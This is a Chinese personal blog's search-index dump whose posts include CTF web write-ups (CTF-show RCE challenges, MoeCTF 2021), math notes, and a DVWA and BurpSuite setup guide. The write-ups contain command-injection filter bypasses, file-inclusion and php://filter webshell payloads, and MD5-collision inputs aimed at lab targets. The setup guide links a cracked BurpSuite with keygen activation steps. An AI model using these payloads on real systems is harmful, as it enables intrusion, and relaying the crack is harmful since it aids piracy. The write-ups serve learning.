我们在PHP中运行一下，发现成功在目录下写入了有命令执行!\n由于这是一个静态靶机，为了减轻服务器负担，故而有删除目录命令的存在，定时清空网站根目录，因此我们要在清空之前连入shell脚本，读取flag.php文件内容，拿到flag。\n参考 [1] 详解PHP://filter以及死亡绕过\n","permalink":"https://shenyimings.github.io/post/13.rce%E4%B8%93%E6%A0%8F/","summary":"本文以CTF-show Web入门29-41题作为例题，学习RCE相关知识。\nWeb 29 过滤了flag字样\n?c=system(\u0026quot;cat f*\u0026quot;);\rWeb 30 过滤了flag|system|php三个关键字，flag和php是待执行命令文本， 可以通过引号、斜杠或反斜杠绕过\necho `cat f\\lag.ph\\p`; 反引号可以执行系统命令\nWeb 31 在cat被禁时，我们还可以采用如下命令\n 1.tac：从最后一行开始显示，是cat的反向显示 2.more：一页一页的显示档案内容 3.less：与more类似 4.head：查看文档的前几行 5.tail：查看文档的后几行 6.nl：显示的时候，顺便输入行号 7.od：以二进制的方式读取档案内容 8.vi：一种编辑器 9.uniq：查看 10.vim：一种编译器\n 空格的代替符号：\n 1.${IFS}\r2.$IFS$1\r3.${IFS\r4.%20\r5.\u0026lt;和\u0026lt;\u0026gt;重定向符\r6.%09\r 构造本题payload\n?c=echo\u0026#39;more%09f*\u0026#39;;  其他题解：\n?c=eval($_GET[1]);\u0026amp;1=system(\u0026#39;cat flag.php\u0026#39;);嵌套脱离了c的正则判断 ?c=echo`strings%09f*`; ?c=\u0026#34;\\x73\\x79\\x73\\x74\\x65\\x6d\u0026#34;(\u0026#34;nl%09fl[a]*\u0026#34;);等价于system()。这个学到了！  Web 32 屏蔽了echo\n分号可以用?\u0026gt;代替，括号可以用“”绕过，利用文件包含的方式查看flag.php，注意要先进行base64转码以绕过关键词过滤。\n?c=include\u0026#34;$_GET[1]\u0026#34;?\u0026gt;\u0026amp;1=php://filter/read=convert.base64- encode/resource=flag.php 绕过死亡EXIT - CNSS 太极掌门人 \u0026lt;?php $filename=$_GET[\u0026#39;filename\u0026#39;]; $content=$_GET[\u0026#39;content\u0026#39;]; file_put_contents($filename,\u0026#34;\u0026lt;?php exit();\u0026#34;.$content); 两个参数变量间用exit()方法隔开，即使注入一句话也无法执行，如何绕过这个“死亡exit”？\n我们只需要将content前面部分内容使用某种手段(如编码)进行处理，导致PHP不能识别该部分即可。\nbase64绕过 base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。\n?filename=php://filter/convert.base64-decode/resource=1.php\u0026amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw== [😮Mid]太极掌门人 \u0026lt;?php error_reporting(0); show_source(__FILE__); function deleteDir($path) { if (is_dir($path)) { $dirs = scandir($path); foreach ($dirs as $dir) { if ($dir !","title":"RCE 远程命令执行漏洞"},{"content":"前言-2021/8/10 今天学长在群里发了西电的新生CTF比赛，题目较为基础，适合我们初学者。\n想来还是感慨颇多的，西电不愧是网安的头部院校，信安的新生还没入学就开始打CTF比赛了，我大二了才刚刚踏入大门而已。\n1. Web安全入门指北-GET \u0026lt;?php include \u0026#34;flag.php\u0026#34;; $moe = $_GET[\u0026#39;moe\u0026#39;]; if ($moe == \u0026#34;flag\u0026#34;) { echo $flag; }else { highlight_file(__FILE__); } 签到题。已给出源代码，根据题目提示，可以看出是一个简单的get命令题。\n在地址栏中发送get请求：\nhttp://47.93.215.154:10000/?moe=flag\n得到flag：\nmoectf{We1c0me_t0_CTF_Web!}\n2. Web安全入门指北-POST \u0026lt;?php include \u0026#34;flag.php\u0026#34;; $moe = $_POST[\u0026#39;moe\u0026#39;]; if ($moe == \u0026#34;flag\u0026#34;) { echo $flag; }else { highlight_file(__FILE__); } 给出源代码，只需要发送post请求给moe变量赋值flag即可。\n用hackbar：\n在post参数里填入moe=flag\nExecute执行即可得flag:moectf{POST_1s_an_1mp0rtant_m3th0d!}\n3. Web安全入门指北-小饼干 这道题非常有意思，通过网页提示:\nYou are not VIP,I will give flag to VIP!\n可以大致猜测要伪造某些访问项目，将非VIP改为VIP。\n用Burp Suite抓包得到，有一个cookie项为VIP=0，可以通过篡改VIP值来达到伪造cookies的目的。\n将抓包结果发送到重发器，将VIP值改为1，点击发送。\n得到flag。\n4. 2048 打开环境，发现是一个2048小游戏\n先玩一下，失败后提示要达到50000分以后才能得到flag。\n试一下盲加get payload：/?score=60000\n无任何效果，说明负载点选则的不对，抓包看一下在游戏失败后会发送什么数据。\n顺便一提，我瞎按的分数都比认真玩的分高。\n失败后，成功抓到包：\n可以看到，原来是在flag.php页面下进行score的get请求。\n既然是get请求，那么直接在浏览器地址栏手动输入即可。\n/flag.php?score=60000\n得到flag。\n5. Web_Inc 这个题卡了很长时间。根据题目提示，是一道MD5绕过题。\n\u0026lt;?php error_reporting(0); $a=$_GET[\u0026#39;a\u0026#39;]; $b=$_POST[\u0026#39;b\u0026#39;]; if(isset($a)){ if($a!=$b\u0026amp;\u0026amp;md5($a)===md5($b)){ include_once \u0026#34;flag\u0026#34;; }else{ echo \u0026#39;try again\u0026#39;; } }else{ highlight_file(__FILE__); } 题目给出了源代码，据此可以得出，我们需要提供一个get方法变量a和一个post方法变量b，a的值不能等于b的值，但a的md5要等于b的md5。\n查阅网上资料得知，PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都按照科学计数法处理为0，如此0=0，我们只需要找到两个md5值为0e开头的字符串即可。\n QNKCDZO\n240610708\ns878926199a\ns155964671as\n214587387a\ns214587387a\n 以上几组数均为一次md5结果为0e开头的字符串，得到这个信息后，我开开心心的打开hackbar传入一组get参数和post参数：\n尝试过多组解，甚至改用BP intruder进行爆破，仍然是冷冰冰的try again。\n无奈，回头仔细观察源代码：\nmd5($a)===md5($b)\n这一项有三个等于号！\n上网查询，发现PHP中===意味着只有类型相同才会进行比较，否则直接返回false，掐断了使用md5为0e的字符串绕过的可能性！\n再查询发现，PHP中的md5函数有漏洞，无法处理数组，遇到数组会报错，但程序能够继续执行。\n故传入a[]=1,b[]=2即可。\n果然，try again的字样消失了，那么flag在哪呢？\n点sources查看一下源代码：\nflag藏在注释里，成功！\n强类型绕过 使用全等于判断时，若数组无效，直接构造两组答案不同但md5相同的payload即可。\n PHP强类型绕过\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2\r\u0026amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\r 6. ezinclude \u0026lt;?php error_reporting(0); if(isset($_GET[\u0026#39;file\u0026#39;])){ $file = $_GET[\u0026#39;file\u0026#39;]; include($file); }else{ highlight_file(__FILE__); } 文件包含，使用了include函数。\n先使用PHP://input流，可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。\npost代码：\n\u0026lt;?php phpinfo(); ?\u0026gt;无效果，怀疑过滤了PHP://input，尝试PHP://filter，可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。\nget一下：?flie=php://filter/read=convert.base64-encode/resource=flag.php\n但很多时候信息不会直接显示在响应页面中，可以将文件内容进行base64编码再读取，然后再自行解码：\nbase64解码后即得到flag:\nflag = moectf{Do_y0u_l1k3_Rcccccccccccccce?}\n7. Do you know HTTP? 这是一道非常有意思的HTTP请求头伪造题，一步一步。\n根据题意，BP抓包后发给Repeater重发器，修改请求头参数为HS\n发送后发现，需要本地ip才可以访问。\n增加XFF项，修改值为127.0.0.1，成功\n接下来需要将网页来源修改为www.ltyyds.com\n增加referer项，值修改为www.ltyyds.com，成功\n浏览器需要LT？在User-Agent项中，将值清空后改为LT。\n成功得到flag！\n8.地狱通信??? 9.babeRCE \u0026lt;?php $rce = $_GET[\u0026#39;rce\u0026#39;]; if (isset($rce)) { if (!preg_match(\u0026#34;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\\;|[0-9]|\\*|\\`|\\%|\\\u0026gt;|\\\u0026lt;|\\\u0026#39;|\\\u0026#34;/i\u0026#34;, $rce)) { system($rce); }else { echo \u0026#34;hhhhhhacker!!!\u0026#34;.\u0026#34;\\n\u0026#34;; } } else { highlight_file(__FILE__); } 源码如图，作为一道RCE（远程命令执行）题，可以说过滤了相当多命令，把命令注入限死在一个很小的范围内，其中，几乎所有查看文件的命令都被过滤了，还把空格过滤了……\n好在，没有过滤转义反斜杠和ls/dir等查看目录命令\n先get传一个ls命令：\n那么，问题就简化了，我们只需要绕过过滤掉的无数命令，试图读取flag.php即可。\n上网搜一下Linux还剩哪些命令：file -f\n该命令在查询出错后会返回文件内容！\n那么，空格怎么替换呢？有${IFS}可以当空格使\n战战兢兢的对照了下，没有被过滤掉的非法字，拼一个命令试试：\n/?rce=file${IFS}-f${IFS}fla\\g.php\n进入地址栏……复制粘贴……回车……没有出现返回内容！\n成功了？右键-查看源代码，果然！\n得到flag！AC！\n参考 [1] CTF中常见php-MD5()函数漏洞\n[2] CTF中文件包含漏洞总结\n[3] CTF之HAHA浏览器修改\n[4] HTTP头伪造\n[5] ctfshow命令执行[50]与常见过滤的思考\n[6] MD5绕过各种姿势\n","permalink":"https://shenyimings.github.io/post/12.moectf-web-write-up/","summary":"前言-2021/8/10 今天学长在群里发了西电的新生CTF比赛，题目较为基础，适合我们初学者。\n想来还是感慨颇多的，西电不愧是网安的头部院校，信安的新生还没入学就开始打CTF比赛了，我大二了才刚刚踏入大门而已。\n1. Web安全入门指北-GET \u0026lt;?php include \u0026#34;flag.php\u0026#34;; $moe = $_GET[\u0026#39;moe\u0026#39;]; if ($moe == \u0026#34;flag\u0026#34;) { echo $flag; }else { highlight_file(__FILE__); } 签到题。已给出源代码，根据题目提示，可以看出是一个简单的get命令题。\n在地址栏中发送get请求：\nhttp://47.93.215.154:10000/?moe=flag\n得到flag：\nmoectf{We1c0me_t0_CTF_Web!}\n2. Web安全入门指北-POST \u0026lt;?php include \u0026#34;flag.php\u0026#34;; $moe = $_POST[\u0026#39;moe\u0026#39;]; if ($moe == \u0026#34;flag\u0026#34;) { echo $flag; }else { highlight_file(__FILE__); } 给出源代码，只需要发送post请求给moe变量赋值flag即可。\n用hackbar：\n在post参数里填入moe=flag\nExecute执行即可得flag:moectf{POST_1s_an_1mp0rtant_m3th0d!}\n3. Web安全入门指北-小饼干 这道题非常有意思，通过网页提示:\nYou are not VIP,I will give flag to VIP!\n可以大致猜测要伪造某些访问项目，将非VIP改为VIP。\n用Burp Suite抓包得到，有一个cookie项为VIP=0，可以通过篡改VIP值来达到伪造cookies的目的。\n将抓包结果发送到重发器，将VIP值改为1，点击发送。\n得到flag。\n4. 2048 打开环境，发现是一个2048小游戏","title":"MoeCTF 2021 西电新生赛WP"},{"content":"前言  所谓推理是指从前提出发推出结论的思维过程，而前提是已知的命题公式集合，结论是从前提出发应用推理规则推出的命题公式。\n 定理3.1  命题公式$A_1,A_2,\\cdots,A_k$推出B的推理正确当且仅当 $$ A_1\\wedge A_2,\\wedge \\cdots,\\wedge A_k \\to B $$ 为重言式。\n 今后把推理的形式结构写成: $$ 前提：A_1,A_2,\\cdots,A_k\\\\ 结论：B $$ 并根据判断定理3.1的蕴含式是否是重言式来确定推理是否正确。根据前2章的讨论，判断是否为重言式有下面3种方法：\n 真值表法 等值演算法 主析取范式法  常用重言蕴含式（推理定律）  $$ (A\\to B)\\wedge A \\Rightarrow B \\qquad 假言推理\\\\ (A\\to B)\\wedge \\neg B\\Rightarrow \\neg A\\qquad 拒取式\\\\ (A\\vee B)\\wedge \\neg B \\Rightarrow A \\qquad 析取三段论\\\\ (A\\to B)\\wedge (B\\to C)\\Rightarrow (A\\to C) \\qquad 假言三段论\\\\ $$\n 推理证明格式 例3.3 在自然推理系统P中构造下面推理的证明。 前提：$$P\\vee q,q\\to r,p\\to s,\\neg s$$\n结论：$$r\\wedge (p\\vee q)$$\n 解 证明： $$ \\begin{align}\np\\to s \\qquad 前提引入\\tag{1}\\\\ \\neg s \\qquad 前提引入\\tag{2}\\\\ \\neg p \\qquad (1)(2)拒取式\\tag{3}\\\\ p\\vee s \\qquad 前提引入\\tag{4}\\\\ q \\qquad (3)(4)析取三段论\\tag{5}\\\\ q\\to r \\qquad 前提引入\\tag{6}\\\\ r \\qquad (5)(6)假言推理\\tag{7}\\\\ r\\wedge (p\\vee q) \\qquad (7)(4)合取引入\\tag{8}\\\\\n\\end{align} $$\n ","permalink":"https://shenyimings.github.io/post/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-ch03/","summary":"前言  所谓推理是指从前提出发推出结论的思维过程，而前提是已知的命题公式集合，结论是从前提出发应用推理规则推出的命题公式。\n 定理3.1  命题公式$A_1,A_2,\\cdots,A_k$推出B的推理正确当且仅当 $$ A_1\\wedge A_2,\\wedge \\cdots,\\wedge A_k \\to B $$ 为重言式。\n 今后把推理的形式结构写成: $$ 前提：A_1,A_2,\\cdots,A_k\\\\ 结论：B $$ 并根据判断定理3.1的蕴含式是否是重言式来确定推理是否正确。根据前2章的讨论，判断是否为重言式有下面3种方法：\n 真值表法 等值演算法 主析取范式法  常用重言蕴含式（推理定律）  $$ (A\\to B)\\wedge A \\Rightarrow B \\qquad 假言推理\\\\ (A\\to B)\\wedge \\neg B\\Rightarrow \\neg A\\qquad 拒取式\\\\ (A\\vee B)\\wedge \\neg B \\Rightarrow A \\qquad 析取三段论\\\\ (A\\to B)\\wedge (B\\to C)\\Rightarrow (A\\to C) \\qquad 假言三段论\\\\ $$\n 推理证明格式 例3.3 在自然推理系统P中构造下面推理的证明。 前提：$$P\\vee q,q\\to r,p\\to s,\\neg s$$","title":"离散数学笔记-命题逻辑的推理理论"},{"content":" [TOC]\nDVWA环境搭建  DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。\n DVWA运行基于LAMP（Linux+Apache+MySQL+PHP），出于时间和个人能力的考虑，很难成功地从0开始搭建这样一套体系，故而使用小皮的PHPStudy环境。\nPHPStudy：https://www.xp.cn/\nDVWA：http://www.dvwa.co.uk/\n一、安装PHP Study 二、配置DVWA 将下载的DVWA压缩包解压到PHP Study的WWW目录下并解压，进入目录中的config文件夹，编辑config.inc.php文件，找到_DVWA['db_password']='root'行，将user改为‘root’；password改为‘root’。\n三、配置PHP Study 开启Apache和PHP服务，点击左边栏网站，左上角创建网站，域名为设置为本机本地域名，查看本地域名方法：进入powershell输入命令ipconfig查看，我电脑本机域名为192.168.0.104\n为什么不设置为localhost 127.0.0.1：Burp Suite配合chrome浏览器抓包时可能无法拦截localhost的数据。\n根目录指向刚刚解压的DVWA-master目录下，点击确认，网站创建成功。\n四、浏览器进入192.108.0.104 点击Create/Reset Database创建数据库\n用户名：admin 默认密码：password\n登陆进入后即部署成功。\nBurpSuite2.1安装  BurpSuite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。\n 1. JDK及BurpSuite破解版下载 链接：https://pan.baidu.com/s/11lrFGT0aGCd4BQcAJrL55w 提取码：w5lg\n2. 配置JAVA环境 安装好jdk后，右键计算机-属性-系统设置-高级-环境变量\n新增两个环境变量\n  %JAVA_HOME%=jdk安装文件夹所在位置，如...\\jdk1.8.0_201\n  %CLASSPATH%=.;%JAVA_HOME%\\lib\\dt.jar;%JAVA_HOME%\\lib\\tools.jar\n  修改path变量，分别添加jdk和jre安装文件夹下的bin目录。\n3. 激活BurpSuite jdk配置完毕后，先打开burp-loader-keygen.jar文件\n点击run\n将license许可证复制入弹出的框中，点击Next，选择Manual activation手动激活。\n将生成的申请码粘贴入注册机中，自动算号，将生成的激活码复制入框中，点击Next即激活成功。\n此后想打开Burp Suite，双击运行目录下的VBS脚本即可。\nBurpSuite Chrome配置 1. 设置流量代理Proxy ​\t在谷歌应用商店中安装Falcon Proxy，添加一个新的代理127.0.0.1:8080，注意和Burp Suite中代理监听器保持一致。\n2. 导入SSL证书以便抓取HTTPS网站内容。 ​\t挂好代理后只能访问http网址，对于https网址则提示不安全，解决方法：访问http:\\\\burp\\，点击右上角下载证书certification，得到一个.der文件，在chrome浏览器进入设置-隐私设置和安全性-管理证书，点击受信任的根证书颁发机构，导入刚刚得到的der证书，注意格式选择所有文件。\n参考 [1] DVWA完整搭建教程\n[2] Burp Suite超详细安装教程\n[3] Burp Suite + Chrome详细抓包教程\n[4] Burp Suite不能拦截localhost\n","permalink":"https://shenyimings.github.io/post/9.dvwa%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+burpsuite2.1%E5%AE%89%E8%A3%85/","summary":"[TOC]\nDVWA环境搭建  DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。\n DVWA运行基于LAMP（Linux+Apache+MySQL+PHP），出于时间和个人能力的考虑，很难成功地从0开始搭建这样一套体系，故而使用小皮的PHPStudy环境。\nPHPStudy：https://www.xp.cn/\nDVWA：http://www.dvwa.co.uk/\n一、安装PHP Study 二、配置DVWA 将下载的DVWA压缩包解压到PHP Study的WWW目录下并解压，进入目录中的config文件夹，编辑config.inc.php文件，找到_DVWA['db_password']='root'行，将user改为‘root’；password改为‘root’。\n三、配置PHP Study 开启Apache和PHP服务，点击左边栏网站，左上角创建网站，域名为设置为本机本地域名，查看本地域名方法：进入powershell输入命令ipconfig查看，我电脑本机域名为192.168.0.104\n为什么不设置为localhost 127.0.0.1：Burp Suite配合chrome浏览器抓包时可能无法拦截localhost的数据。\n根目录指向刚刚解压的DVWA-master目录下，点击确认，网站创建成功。\n四、浏览器进入192.108.0.104 点击Create/Reset Database创建数据库\n用户名：admin 默认密码：password\n登陆进入后即部署成功。\nBurpSuite2.1安装  BurpSuite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。\n 1. JDK及BurpSuite破解版下载 链接：https://pan.baidu.com/s/11lrFGT0aGCd4BQcAJrL55w 提取码：w5lg\n2. 配置JAVA环境 安装好jdk后，右键计算机-属性-系统设置-高级-环境变量\n新增两个环境变量\n  %JAVA_HOME%=jdk安装文件夹所在位置，如...\\jdk1.8.0_201\n  %CLASSPATH%=.;%JAVA_HOME%\\lib\\dt.jar;%JAVA_HOME%\\lib\\tools.jar\n  修改path变量，分别添加jdk和jre安装文件夹下的bin目录。\n3. 激活BurpSuite jdk配置完毕后，先打开burp-loader-keygen.jar文件\n点击run\n将license许可证复制入弹出的框中，点击Next，选择Manual activation手动激活。\n将生成的申请码粘贴入注册机中，自动算号，将生成的激活码复制入框中，点击Next即激活成功。\n此后想打开Burp Suite，双击运行目录下的VBS脚本即可。\nBurpSuite Chrome配置 1. 设置流量代理Proxy ​\t在谷歌应用商店中安装Falcon Proxy，添加一个新的代理127.","title":"DVWA环境搭建 + BurpSuite2.1安装 + Chrome配置"},{"content":"图片隐写  图片EXIF信息 GIF图片 文件头 16进制编码  编码 Readflag\n社工   Bugku社工_进阶收集\n根据题目给出的说说截图，有如下信息：\n 终点位置突出特征：有塔      坐地铁需要7站，中间还要转一站\n 出发站为始发站 家位置在始发站和第二站的中间位置  根据以上信息，先对说说配图进行百度识图，查找到地理位置为西安大雁塔，对照西安地铁图，距离大雁塔站有7站且为始发站的站点只有韦曲南站，至此即可确定小美所住的小区在韦曲南站和航天城站之间，利用百度地图标尺画两个圆，可以大致确定符合条件的7家小区，挨个尝试可得flag。\n   Bugku_隐写)\n题目文件为一张PNG格式图片，Windows自带图片浏览器无法正常打开该图片，说明图片内容经过人为篡改。使用工具TweakPng查看png内容，将图片大小的chunk部分高度修改为宽度一致，500px，保存，图片flag得以正常显示。\n正常做法：用Python脚本计算和图片大小相匹配的正常宽高，再利用Tweakpng查看并修改。\n  ","permalink":"https://shenyimings.github.io/post/6.bugku_misc/","summary":"图片隐写  图片EXIF信息 GIF图片 文件头 16进制编码  编码 Readflag\n社工   Bugku社工_进阶收集\n根据题目给出的说说截图，有如下信息：\n 终点位置突出特征：有塔      坐地铁需要7站，中间还要转一站\n 出发站为始发站 家位置在始发站和第二站的中间位置  根据以上信息，先对说说配图进行百度识图，查找到地理位置为西安大雁塔，对照西安地铁图，距离大雁塔站有7站且为始发站的站点只有韦曲南站，至此即可确定小美所住的小区在韦曲南站和航天城站之间，利用百度地图标尺画两个圆，可以大致确定符合条件的7家小区，挨个尝试可得flag。\n   Bugku_隐写)\n题目文件为一张PNG格式图片，Windows自带图片浏览器无法正常打开该图片，说明图片内容经过人为篡改。使用工具TweakPng查看png内容，将图片大小的chunk部分高度修改为宽度一致，500px，保存，图片flag得以正常显示。\n正常做法：用Python脚本计算和图片大小相匹配的正常宽高，再利用Tweakpng查看并修改。\n  ","title":"MISC类型题目及技巧"},{"content":"学习内容 根据上一篇笔记选择的比赛方向：Web和Crypto，安排并希望在假期进行以下内容的学习：\n  Python编程基础-网络编程，并提升Python的水平取代C++成为自己最熟练的编程语言。\n  Linux系统学习（基于Ubuntu 18.04）目标：建站\n  SQL注入（SQL基本语法）\n  PHP基本语法\n  学习计划 假期苦短，每天效率也不高，单纯的看视频/看书想必毫无持续性，故而学习务必要结合实例，如我将《Learn Python 3 the HARD WAY》这本书作为Python的入门书籍，书中有大量例子，一个一个做下去有成就感推动前进，又能很好的掌握基础知识。\n   7.23-8.5 学习python 完成抓包项目     8.6-8.10 学习LINUX系统 BUGKU站刷题   8.11-8.15 Linux系统实战-建站   8.16-8.27 学习SQL注入相关知识    ","permalink":"https://shenyimings.github.io/post/4.%E5%81%87%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/","summary":"学习内容 根据上一篇笔记选择的比赛方向：Web和Crypto，安排并希望在假期进行以下内容的学习：\n  Python编程基础-网络编程，并提升Python的水平取代C++成为自己最熟练的编程语言。\n  Linux系统学习（基于Ubuntu 18.04）目标：建站\n  SQL注入（SQL基本语法）\n  PHP基本语法\n  学习计划 假期苦短，每天效率也不高，单纯的看视频/看书想必毫无持续性，故而学习务必要结合实例，如我将《Learn Python 3 the HARD WAY》这本书作为Python的入门书籍，书中有大量例子，一个一个做下去有成就感推动前进，又能很好的掌握基础知识。\n   7.23-8.5 学习python 完成抓包项目     8.6-8.10 学习LINUX系统 BUGKU站刷题   8.11-8.15 Linux系统实战-建站   8.16-8.27 学习SQL注入相关知识    ","title":"暑假CTF学习计划"},{"content":"了解CTF  CTF 的前身是传统黑客之间的网络技术比拼游戏，起源于 1996 年第四届 DEFCON。CTF比赛有以下突出特点：\n 比赛侧重于对计算机底层和系统安全的核心能力，Web 漏洞攻防技巧完全被忽略。 竞赛环境趋向多 CPU 指令架构集，多操作系统，多编程语言。 采用「零和」计分规则。 团队综合能力考验：逆向分析、漏洞挖掘、漏洞利用、漏洞修补加固、网络流量分析、系统安全运行维护以及安全方面的编程调试。   CTF竞赛内容 常见六个分类\n  Web - 网络攻防\n考察Web安全中的常见漏洞，如SQL注入、XSS、CSRF、文件包含、文件上传、代码审计。Web安全题型最为常见。\n  RE - 逆向工程\n反编译、软件保护、反调试、软件加壳脱壳。\n  PWN - 二进制漏洞\n与计算机操作系统底层相关，主要出现在Linux平台上。\n  Crypto - 密码学\n古典密码与现代密码学安全两方面\n  Mobile - 移动安全\n安卓逆向相关\n  MISC - 安全杂项\n信息搜集（社工）、编码分析、取证分析、隐写分析等\n  比赛学习方向选择 基于我个人对于六个分类的了解，我选择Web方向与Crypto方向。\n  Web\n作为一个尝试过Minecraft自建服务器、外网vps搭梯子（学习用）、购置域名建WordPress小站、提取视频网站M3U8下载地址的ctf beginner，Web方向是我最为感兴趣和想学习的方向，也是我认为最有应用性和最能获得成就感的方向。Web方向知识面的广度很宽，涉及范围相当大，故而学习需要恒心。\n  Crypto\n选择这个方向的原因很简单，我是目前所读专业即为信息安全（密码学方向） 故而此方向与学科所学相关，虽难但也必须披荆斩棘，筚路蓝缕。\n  次要方向：PWN\n我选择PWN方向作为我的次要学习方向，因为PWN基于Linux系统，这是我目前不尽了解但又十分重要的方向，Linux系统的使用和熟悉从本专业学习、就业、深造等方面都意义非凡，故希望通过对PWN方向的学习加强系统底层原理的了解。\n  ","permalink":"https://shenyimings.github.io/post/3.ctf%E6%AF%94%E8%B5%9B%E6%96%B9%E5%90%91%E9%80%89%E6%8B%A9/","summary":"了解CTF  CTF 的前身是传统黑客之间的网络技术比拼游戏，起源于 1996 年第四届 DEFCON。CTF比赛有以下突出特点：\n 比赛侧重于对计算机底层和系统安全的核心能力，Web 漏洞攻防技巧完全被忽略。 竞赛环境趋向多 CPU 指令架构集，多操作系统，多编程语言。 采用「零和」计分规则。 团队综合能力考验：逆向分析、漏洞挖掘、漏洞利用、漏洞修补加固、网络流量分析、系统安全运行维护以及安全方面的编程调试。   CTF竞赛内容 常见六个分类\n  Web - 网络攻防\n考察Web安全中的常见漏洞，如SQL注入、XSS、CSRF、文件包含、文件上传、代码审计。Web安全题型最为常见。\n  RE - 逆向工程\n反编译、软件保护、反调试、软件加壳脱壳。\n  PWN - 二进制漏洞\n与计算机操作系统底层相关，主要出现在Linux平台上。\n  Crypto - 密码学\n古典密码与现代密码学安全两方面\n  Mobile - 移动安全\n安卓逆向相关\n  MISC - 安全杂项\n信息搜集（社工）、编码分析、取证分析、隐写分析等\n  比赛学习方向选择 基于我个人对于六个分类的了解，我选择Web方向与Crypto方向。\n  Web\n作为一个尝试过Minecraft自建服务器、外网vps搭梯子（学习用）、购置域名建WordPress小站、提取视频网站M3U8下载地址的ctf beginner，Web方向是我最为感兴趣和想学习的方向，也是我认为最有应用性和最能获得成就感的方向。Web方向知识面的广度很宽，涉及范围相当大，故而学习需要恒心。\n  Crypto\n选择这个方向的原因很简单，我是目前所读专业即为信息安全（密码学方向） 故而此方向与学科所学相关，虽难但也必须披荆斩棘，筚路蓝缕。\n  次要方向：PWN","title":"CTF比赛方向选择"},{"content":" 系统选择 Linux有多种发行版，作为一名小白，我选择Ubuntu的原因是以前用过并且感觉桌面界面十分讨喜，再者，Ubuntu作为常见的个人桌面操作系统，使用人数相对较多，教程也更多，对萌新十分友善。\n载体 最标准的方式当然是重装系统咯，总是佩服小时候爱捣鼓的自己，想格盘就格盘，说重装就重装了，长大以后，不知是懒了还是如何，很难再去断舍离了，只能继续看着又快满的C盘抱残守旧了，单系统不可取，双系统也要重新给硬盘分区，过于麻烦，那就传统的VMware虚拟机吧，在去Ubuntu官网下载镜像时，发现了一个全新的选择：Windows WSL，即Windows Subsystem for Linux，籍此可以直接在Windows 10上运行Ubuntu，安装便捷，启动快速，就决定是你了！\n系统配置（学习网址：CSDN博客）  安装好后首先设置root用户, 更换apt数据源  sudo passwd root su root cd /etc/apt cp sources.list sources.list.bak #备份配置文件 vim sources.list #编辑配置文件 将配置文件内容更改为阿里云镜像源  deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse VIM基本基本基本命令：按i进入插入模式，进行编辑；按esc回到标准模式，输入\n:wq保存并退出\n 安装Python 3.9\nsudo apt update\rsudo apt install software-properties-common 1、使用Apt-Get安装Python 3.9 Apt软件包管理器提供了在Ubuntu系统上安装Python 3.9的简单方法。请按照以下步骤操作： 打开系统上的终端，然后为系统配置Deadsnakes PPA。 sudo add-apt-repository ppa:deadsnakes/ppa 在Ubuntu系统上添加ppa后，更新apt缓存并在Ubuntu上安装Python 3.9。 sudo apt update\rsudo apt install python3.9 等待安装完成。通过执行以下命令检查Python版本： python3.9 -V\n  至此，一个船新的Ubuntu 18.04 LTS 便配置完毕。\n","permalink":"https://shenyimings.github.io/post/2.ubuntu%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/","summary":"系统选择 Linux有多种发行版，作为一名小白，我选择Ubuntu的原因是以前用过并且感觉桌面界面十分讨喜，再者，Ubuntu作为常见的个人桌面操作系统，使用人数相对较多，教程也更多，对萌新十分友善。\n载体 最标准的方式当然是重装系统咯，总是佩服小时候爱捣鼓的自己，想格盘就格盘，说重装就重装了，长大以后，不知是懒了还是如何，很难再去断舍离了，只能继续看着又快满的C盘抱残守旧了，单系统不可取，双系统也要重新给硬盘分区，过于麻烦，那就传统的VMware虚拟机吧，在去Ubuntu官网下载镜像时，发现了一个全新的选择：Windows 